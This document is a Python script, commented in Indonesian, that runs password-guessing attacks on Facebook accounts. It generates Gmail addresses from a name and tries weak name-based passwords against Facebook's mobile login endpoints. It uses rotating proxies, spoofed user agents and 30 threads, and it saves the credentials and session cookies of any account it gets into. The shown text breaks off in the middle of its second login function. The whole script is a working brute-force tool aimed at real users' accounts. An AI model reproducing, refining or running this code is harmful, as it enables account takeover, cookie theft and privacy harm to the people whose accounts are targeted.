#THANKS TO HADI-XD
#SC FREE JANGAN DI JUAL BELIKAN !!
#--------------------[ IMPORT-MODULE ]--------------------#
import requests,json,os,sys,random,datetime,time,re,platform
from concurrent.futures import ThreadPoolExecutor as tred
#----------------------[ MODULE-RICH ]------------------------#
from rich.tree import Tree
from rich import print as cetak
from time import sleep as waktu
from rich.panel import Panel as panel
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
#-----------------------[ INDICATION ]---------------------#
id,id2,loop,ok,cp,akun,method,tokenku,uid,ugen= [],[],0,0,0,[],[],[],[],[]
#-------------------------[ GET-PROXY ]-------------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('No internet connection')
prox=open('.prox.txt','r').read().splitlines()
#-------------------------[ USER-AGENT ]----------------------#	
ugen = []

for bgical in range(10000):
    rr = random.randint; rc = random.choice
    smsg = (['SM-J100Y','SM-J105Y','SM-J111F','SM-G531H','SM-N900V','SM-P901','SM-N915F','SM-J200G','SM-A310F','SM-J120H','SM-T280','SM-A800F','SM-J500FN','SM-J105H','SM-J105B','SM-Z200Y','SM-J120F','SM-T360','SM-T331','SM-T530','SM-J320','SM-J700F','SM-J700H','SM-A510F','SM-T585','SM-T550','SM-G318H','SM-G925F','SM-T350','SM-T330NU','SM-T537A','SM-T670','SM-G925F','SM-S920L','SM-G530T1','SM-G530AZ','SM-T535','SM-J700F','SM-T805Y','SM-T531','SM-T285','SM-T550','SM-G928T','SM-T350','SM-T810','SM-G920A','SM-A500FU','SM-A300H','SM-N910G','SM-T555','SM-T815Y','SM-N915FY','SM-G920P','SHV-E330S','SM-N920P','SM-G361H','SM-N920G','SM-G530T','SM-G925F','SM-G925P','SM-A500M','SM-N915A','SM-N915F','SM-G920A','SM-A500H','SM-G925L','SM-J100H','SM-G928T','SM-G925K','SM-G920I','SM-E500H','SM-N920V 4G','SM-N920C','SM-J110F','SM-T337A','SM-G925T','SM-G900F','SM-T800','SM-N900V 4G','GT-I9515','SM-T530NU','SM-T530','GT-I950','SM-T350','SM-G360T1','SM-A800F','SM-T805','SM-T535','SM-T237P','SM-G900I','SM-G928F','SM-T900','SM-G850F','SM-G925F','SM-T817T','SM-T355Y','SM-T335','SM-G890A','SM-J500FN','SM-T530NU','SAMSUNG SM-J210Y','SAMSUNG SM-E203Y','SAMSUNG SM-T87V','SAMSUNG SM-D738P','SAMSUNG SM-W748D','SAMSUNG SM-Z794M','SAMSUNG SM-K144T','SAMSUNG SM-L372N','SAMSUNG SM-B588T','SAMSUNG SM-R584V','SAMSUNG SM-R108Z','SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H'])
    gua = f"Mozilla/5.0 (X11; CrOS aarch64 15633.69.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,200))}.0.{str(rr(2500,8500))}.{str(rr(40,288))} Safari/537.36"
    ical = f"Mozilla/5.0 (Linux; Android {str(rr(5,20))}; moto g power ({str(rr(2000,3000))})) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,100))}.0 Chrome/{str(rr(10,200))}.0.{str(rr(2500,8500))}.{str(rr(40,288))} Mobile Safari/537.36"
    uateddy = random.choice([gua, ical])
    ugen.append(uateddy)
	
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
    
#--------------------[ WARNA-COLOR ]-----------------------#
H = '\x1b[1;92m' # WARNA HIJAU MUDA
h = '\033[32m'    # WARNA HIJAU TUA
K = '\033[93m'    # WARNA KUNING MUDA
k = '\033[33m'    # WARNA KUNING TUA
B = '\33[1;96m'   # WARNA BIRU MUDA
b = '\x1b[0;34m' # WARNA BIRU TUA
M = '\x1b[1;91m'# WARNA MERAH
U = '\033[95m'    # WARNA UNGU
x = '\33[m'           # WARNA DEFAULT
xrdev = random.choice([H,K,M,U,B])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'live-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'chek-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#-----------------------[ ANIMASI ]-----------------------------#
def xr_dev(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	menu_xr()
#---------------------[ LOGO-BANNER ]---------------------#
def logo():
	clear()
	print(f'''                                         
╔═╗┌─┐╔╗   ╦  ╦┬╔═╗
║  ├┤ ╠╩╗  ╚╗╔╝│╠═╝
╚═╝└  ╚═╝   ╚╝ ┴╩  
{H} ''')
#--------------------[ BAGIAN-MENU ]----------------------#
def menu_xd():
	os.system ('clear') 
	logo() 
	print(f'[1] CRACK DARI EMAIL') 
	print(f'[2] CEK RESULT CRACk')
	print(f'[3] KELUAR DARI SCRIPT')
	xdxd_dev = input(f'\npilih menu : ')
	if xdxd_dev in ['1','01']:
		crack_email()
	elif xdxd_dev in ['2','02']:
		cek_result()
	elif xdxd_dev in ['3','03']:os.system('rm -rf .coonk.txt');print('Sukses Logout - Good By Sampai jumpa');exit() #XD
	else:
		print('Pilih yang benar')
		time.sleep(3) 
		back()
#---------------------[ RESULT-CRACK ]-----------------------#
def cek_result():
	print('')
	print(f'[1] CEK RESULT OK')
	print(f'[2] CEK RESULT CP')
	print(f'[3] EXIT')
	xr = input(f'\npilih menu : ')
	if xr in ['1','01']: 
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('file tidak di temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('kamu tidak mempunyai result live')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'     %s.%s {h}%s{x} akun'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'     %s.%s {h}%s{x} akun'%(cih,isi,(len(hem))))
			geeh = input(f'\npilih result : ')
			try:geh = lol[geeh]
			except KeyError:
				print('pilih yang benar')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('file tidak di temukan')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}     {H}*---> {cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}{x}')
				nocp +=1
			print('')
			input(f'klik enter untuk kembali ke menu utama ')
			menu_xr()
	elif xr in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(' Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'     %s.%s {k}%s{x} akun'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'     %s.%s {k}%s{x} akun'%(cih,isi,(len(hem))))
			geeh = input(f'\npilih result : ')
			try:geh = lol[geeh]
			except KeyError:
				print('pilih yang benar  ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('file tidak di temukan')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}     {k}*---> {cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}klick enter untuk kembali ke menu')
			menu_xr()
	elif kz in ['3','03']:
		back()
	else:
		print('Pilih Yang Bener ')
		exit() 
#-------------------[ CRACK-EMAIL ]------------------#
def crack_email():
	rc = random.choice
	rr = random.randint
	bas = ['nazri','nizar','reni','alan','aidil','kunyuk','bocil','lusi','alam','yusup','yusep','sidik','encas','erika','ika','agil','lang','ling','lung','ani','keyla','septi','cepi','galuh','rona','ronaldo','ado','deon','ratu','ara','nia','nina','panji','heru','gaga','ega','agnes','ilma','puji','pujia','uji','hesti','reksa','bulan','alip','alif','sahri','raisa','mela','mella','cucu','ria','sarah','bunga','vina','cia','tiya','candra','bilal','fatimah','arya','kevin','bima','nurul','suparhan','ahmad','mahmud','asep','ramdan','saputra','kurnia','ramdani','hilda','mita','miya','ayu','gopur','tia','bono','mutiara','arin','wiwin','winda','penita','iyus','herlan','dinda','nda','naya','niya','aca','bandros','refan','wapda','rahman','maman','mimin','fitrah','adit','adat','fiki','aulia','tata','enung','esih','jajang','febi','ismi','wida','sanji','regi','rega','ferdi','firman','jimi','mawar','ratna','dimas','sasa','tia','tini','medusa','dewi','winda','setia','putri','danil','galang','gilang','denis','deni','sela','nabil','sinta','amel','melia','putra','telor','sabun','nia','kira','mela','mila','lisa','lida','lidi','ali','jaya','kiki','pian','pita','juwita','junita','nita','anisa','nisa','sani','sari','uje','uji','olip','oli','fikar','nur','siti','aji','oji','rada','imas','mia','tuti','tia','ima','sendi','febian','rima','raka','rati','jiman','dodi','reza','yani','galih','hia','siva','opik','kamal','jamal','linda','lida','ida','adi','andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko','gans']
	blk = ['boy','mabok','eam','aulia','kasih','cantik','bocil','ganz','cans','kasep','ganteng','tzy','1','2','3','4','5','6','7','8','9','99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	print('') 
	print('masukan nama terserah kalian') 
	nama = input(f'nama  : ')
	if ',' in str(nama):
		exit(f'masukan 1 nama saja')
	doma = '@gmail.com'
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f'masukan domain yang benar')
	jumlah = input(f'total : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in id:pass
		else:id.append(D+'|'+nama)
		if len(id)==1010101010101010101:setting()
	setting()

#-------------[ SETTING UNTUK CRACK]---------------#
def setting():
	print('')
	print(f'[1] CRACK DARI URUTAN ID OLD')
	print(f'[2] CRACK DARI URUTAN ID NEW')
	print(f'[3] CRACK DARI URUTAN ID RANDOM')
	xr_dev_ganz = input('\npilih urutan : ')
	if xr_dev_ganz in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif xr_dev_ganz in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif xr_dev_ganz in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('Pilih Yang Bener ')
		exit()
	print('')
	print(f'[1] LOGIN WITH M.FACEBOOK.COM ASYNC {H}REKOMENDASI{x}') 
	print(f'[2] LOGIN WITH MTOUCH.FACEBOOK.COM ASYNC {H}REKOMENDASI{x}') 
	xr_ganz = input(f'\npilih metode : ')
	if xr_ganz in ['1','01']:
		method.append('mobile')
	elif xr_ganz in ['2','02']:
		method.append('mtouch')
	else:
		method.append('mobile')
	print('') 
	print(f'[1] NAMA123 + NAMA1234 + NAMA12345') 
	print(f'[2] NAMA321 + NAMA4321 + NAMA54321') 
	print(f'[3] NAMA123 + NAMA1234 + NAMA12345 + NAMA123456') 
	xr_dev = input(f'\npilih password : ') 
	if xr_dev in ['1','01']:
		pass_v1() 
	elif xr_dev in ['2','02']:
		pass_v2() 
	elif xr_dev in ['3','03']:
		pass_v3() 
#-------------------[ PASSWORD-V1 ]-------------------#
def pass_v1():
	global prog,des
	print('')
	print(f'result : {H}%s{x} '%(okc))
	print(f'result : {K}%s{x} '%(cpc)) 
	print(f'mainkan mode pesawat jika tidak ada hasil') 
	print('')
	prog = Progress(TextColumn('{task.description}'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = ['kamunanya','kamu nanya','kata sandi']
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'01')
						pwv.append(frs+'123456')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'01')
						pwv.append(frs+'123456')
				if 'mobile' in method:
					pool.submit(crackmobile,idf,pwv)
				elif 'mtouch' in method:
					pool.submit(crackmtouch,idf,pwv)
				else:
					pool.submit(crackmtouch,idf,pwv)
	print('')
	print(f'total live : {H}%s{x} '%(ok)) 
	print(f'total chek : {k}%s{x} '%(cp))
#-------------------[ PASSWORD-V2 ]-------------------#
def pass_v2():
	global prog,des
	print('')
	print(f'     result : {H}%s{x} '%(okc))
	print(f'     result : {K}%s{x} '%(cpc)) 
	print(f'     mainkan mode pesawat jika tidak ada hasil') 
	print('')
	prog = Progress(TextColumn('{task.description}'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'321')
						pwv.append(frs+'4321')
						pwv.append(frs+'54321') 
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'321')
						pwv.append(frs+'4321')
						pwv.append(frs+'54321')
				if 'mobile' in method:
					pool.submit(crackmobile,idf,pwv)
				elif 'mtouch' in method:
					pool.submit(crackmtouch,idf,pwv)
				else:
					pool.submit(crackmtouch,idf,pwv)
	print('')
	print(f'total live : {H}%s{x} '%(ok)) 
	print(f'total chek : {k}%s{x} '%(cp))
#-------------------[ PASSWORD-V3 ]-------------------#
def pass_v3():
	global prog,des
	print('')
	print(f'result : {H}%s{x} '%(okc))
	print(f'result : {K}%s{x} '%(cpc)) 
	print(f'mainkan mode pesawat jika tidak ada hasil') 
	print('')
	prog = Progress(TextColumn('{task.description}'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345') 
						pwv.append(frs+'123456')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'22')
						pwv.append(frs+'09')
						pwv.append(frs+'11')
						pwv.append(frs+'03')
						pwv.append(frs+'00')
						pwv.append(frs+'06')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'22')
						pwv.append(frs+'09')
						pwv.append(frs+'11')
						pwv.append(frs+'03')
						pwv.append(frs+'00')
						pwv.append(frs+'06')
				if 'mobile' in method:
					pool.submit(crackmobile,idf,pwv)
				elif 'mtouch' in method:
					pool.submit(crackmtouch,idf,pwv)
				else:
					pool.submit(crackmtouch,idf,pwv)
	print('')
	print(f'total live : {H}%s{x} '%(ok)) 
	print(f'total chek : {k}%s{x} '%(cp))
#--------------------[ MOBILE-ASYNC ]-----------------#
def crackmobile(idf,pwv):
	global loop,ok,cp
	bo = random.choice([U,H,K,B])
	prog.update(des,description=f"[LuziXploit] {loop}/{len(id)} Live:[bold green]{ok}[/] Chek:[bold yellow]{cp}[/]") #SOURCE LUZI-XD
	prog.advance(des) 
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=140810032656374&kid_directed_site=0&app_id=140810032656374&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fclient_id%3D140810032656374%26redirect_uri%3Dhttps%253A%252F%252Faccounts.pixiv.net%252Fpigya%252Fproxy%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3DJUMiDpdgLW2kqY-z2dKtIVwYyWQ4Ft1uT3fY2uBxJOs%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D61c74856-ed0f-4045-b074-b15f877f9e10%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.pixiv.net%2Fpigya%2Fproxy%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DJUMiDpdgLW2kqY-z2dKtIVwYyWQ4Ft1uT3fY2uBxJOs%23_%3D_&display=touch&locale=es_LA&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=140810032656374&kid_directed_site=0&app_id=140810032656374&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fclient_id%3D140810032656374%26redirect_uri%3Dhttps%253A%252F%252Faccounts.pixiv.net%252Fpigya%252Fproxy%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3DJUMiDpdgLW2kqY-z2dKtIVwYyWQ4Ft1uT3fY2uBxJOs%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D61c74856-ed0f-4045-b074-b15f877f9e10%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.pixiv.net%2Fpigya%2Fproxy%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DJUMiDpdgLW2kqY-z2dKtIVwYyWQ4Ft1uT3fY2uBxJOs%23_%3D_&display=touch&locale=es_LA&pl_dbl=0&refsrc=deprecated&_rdr",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				tree = Tree(f"  ")
				tree.add(f"[bold green]{idf}")
				tree.add(f"[bold green]{pw}")
				tree.add(f"[bold blue]{kuki}")
				tree.add(f"[bold purple]{ua}\n")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ MTOUCH-ASYNC ]-----------------#
def crackmtouch(idf,pwv):
	global loop,ok,cp
	bo = random.choice([U,H,K,B])
	prog.update(des,description=f"[XD] {loop}/{len(id)} Live:[bold green]{ok}[/] Chek:[bold yellow]{cp}[/]")
	prog.advance(des) 
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host": "touch.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Chromium";v="107", "Not=A?Brand";v="24"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-dest": "document","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': 'browser_dropdown', 'prefill_type': 'password', 'first_prefill_source': 'browser_dropdown', 'first_prefill_type': 'contact_point', 'had_cp_prefilled': 'true', 'had_password_prefilled': 'true', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.15625; wd=501x950'
			heade={
			"Host": "touch.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://touch.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
